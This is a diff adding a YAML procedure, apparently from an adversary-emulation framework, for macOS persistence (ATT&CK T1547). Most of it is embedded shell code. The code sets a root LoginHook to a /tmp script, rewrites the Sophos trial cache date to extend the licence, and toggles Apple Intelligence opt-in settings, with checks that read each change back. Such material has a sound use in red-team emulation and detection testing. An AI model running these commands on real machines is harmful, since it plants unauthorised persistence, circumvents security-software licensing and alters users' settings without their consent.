@@ -1,0 +1,105 @@
+procedure_name: modify_preferences
+ttp_id: T1547
+tactic: Persistence
+guid: 38338fec-dc99-4427-9dfc-b75be2b3d706
+intent: Establish persistence by modifying system login preferences and extending
+  application trial periods using defaults write commands
+author: '@darmado | https://x.com/darmad0'
+version: 1.0.0
+created: '2025-01-27'
+updated: '2025-05-30'
+procedure:
+  arguments:
+  - option: --login-hook
+    description: Set login hook for persistence
+    type: string
+    execute_function:
+    - set_login_hook
+  - option: --extend-sophos
+    description: Extend Sophos trial cache date
+    execute_function:
+    - extend_sophos_trial
+  - option: --ai-manipulation
+    description: Manipulate Apple Intelligence settings
+    execute_function:
+    - manipulate_ai_settings
+  - option: --check-persistence
+    description: Check current persistence mechanisms
+    execute_function:
+    - check_persistence_status
+  global_variable:
+  - name: CMD_DEFAULTS
+    type: string
+    default_value: defaults
+  - name: CMD_SUDO
+    type: string
+    default_value: sudo
+  - name: DEFAULT_HOOK_PATH
+    type: string
+    default_value: /tmp/gain_persistence.sh
+  - name: SOPHOS_TRIAL_DATE
+    type: string
+    default_value: 2026-05-30 08:46:00 +0000
+  functions:
+  - name: set_login_hook
+    type: main
+    language:
+    - shell
+    opsec:
+      check_fda:
+        enabled: false
+    code: "set_login_hook() {\n    $CMD_PRINTF \"PERSISTENCE_TYPE|COMMAND|RESULT\\\
+      n\"\n    \n    # Use provided path or default\n    local hook_path=\"${INPUT_LOGIN_HOOK:-$DEFAULT_HOOK_PATH}\"\
+      \n    \n    # Set login hook\n    local result\n    result=$($CMD_SUDO $CMD_DEFAULTS\
+      \ write /Library/Preferences/com.apple.loginwindow LoginHook \"$hook_path\"\
+      \ 2>&1)\n    $CMD_PRINTF \"LOGIN_HOOK|sudo defaults write /Library/Preferences/com.apple.loginwindow\
+      \ LoginHook|%s\\n\" \"$result\"\n    \n    return 0\n}\n"
+  - name: extend_sophos_trial
+    type: main
+    language:
+    - shell
+    opsec:
+      check_fda:
+        enabled: false
+    code: "extend_sophos_trial() {\n    $CMD_PRINTF \"PERSISTENCE_TYPE|COMMAND|RESULT\\\
+      n\"\n    \n    # Read current Sophos trial date\n    local current_date\n  \
+      \  current_date=$($CMD_DEFAULTS read com.sophos.ipm cacheDate 2>/dev/null)\n\
+      \    $CMD_PRINTF \"SOPHOS_CURRENT|defaults read com.sophos.ipm cacheDate|%s\\\
+      n\" \"$current_date\"\n    \n    # Extend Sophos trial cache date\n    local\
+      \ result\n    result=$($CMD_DEFAULTS write com.sophos.ipm cacheDate \"$SOPHOS_TRIAL_DATE\"\
+      \ 2>&1)\n    $CMD_PRINTF \"SOPHOS_EXTEND|defaults write com.sophos.ipm cacheDate|%s\\\
+      n\" \"$result\"\n    \n    return 0\n}\n"
+  - name: manipulate_ai_settings
+    type: main
+    language:
+    - shell
+    opsec:
+      check_fda:
+        enabled: false
+    code: "manipulate_ai_settings() {\n    $CMD_PRINTF \"PERSISTENCE_TYPE|COMMAND|RESULT\\\
+      n\"\n    \n    # Disable Apple Intelligence\n    local disable_result\n    disable_result=$($CMD_DEFAULTS\
+      \ write com.apple.CloudSubscriptionFeatures.optIn 545129924 -bool false 2>&1)\n\
+      \    $CMD_PRINTF \"AI_DISABLE|defaults write com.apple.CloudSubscriptionFeatures.optIn\
+      \ 545129924 -bool false|%s\\n\" \"$disable_result\"\n    \n    # Enable Apple\
+      \ Intelligence\n    local enable_result\n    enable_result=$($CMD_DEFAULTS write\
+      \ com.apple.CloudSubscriptionFeatures.optIn 545129924 -bool true 2>&1)\n   \
+      \ $CMD_PRINTF \"AI_ENABLE|defaults write com.apple.CloudSubscriptionFeatures.optIn\
+      \ 545129924 -bool true|%s\\n\" \"$enable_result\"\n    \n    return 0\n}\n"
+  - name: check_persistence_status
+    type: main
+    language:
+    - shell
+    opsec:
+      check_fda:
+        enabled: false
+    code: "check_persistence_status() {\n    $CMD_PRINTF \"PERSISTENCE_TYPE|COMMAND|RESULT\\\
+      n\"\n    \n    # Check login hook\n    local login_hook\n    login_hook=$($CMD_SUDO\
+      \ $CMD_DEFAULTS read /Library/Preferences/com.apple.loginwindow LoginHook 2>/dev/null)\n\
+      \    $CMD_PRINTF \"LOGIN_HOOK_CHECK|sudo defaults read /Library/Preferences/com.apple.loginwindow\
+      \ LoginHook|%s\\n\" \"$login_hook\"\n    \n    # Check Sophos trial date\n \
+      \   local sophos_date\n    sophos_date=$($CMD_DEFAULTS read com.sophos.ipm cacheDate\
+      \ 2>/dev/null)\n    $CMD_PRINTF \"SOPHOS_DATE_CHECK|defaults read com.sophos.ipm\
+      \ cacheDate|%s\\n\" \"$sophos_date\"\n    \n    # Check AI settings\n    local\
+      \ ai_setting\n    ai_setting=$($CMD_DEFAULTS read com.apple.CloudSubscriptionFeatures.optIn\
+      \ 545129924 2>/dev/null)\n    $CMD_PRINTF \"AI_SETTING_CHECK|defaults read com.apple.CloudSubscriptionFeatures.optIn\
+      \ 545129924|%s\\n\" \"$ai_setting\"\n    \n    return 0\n} "
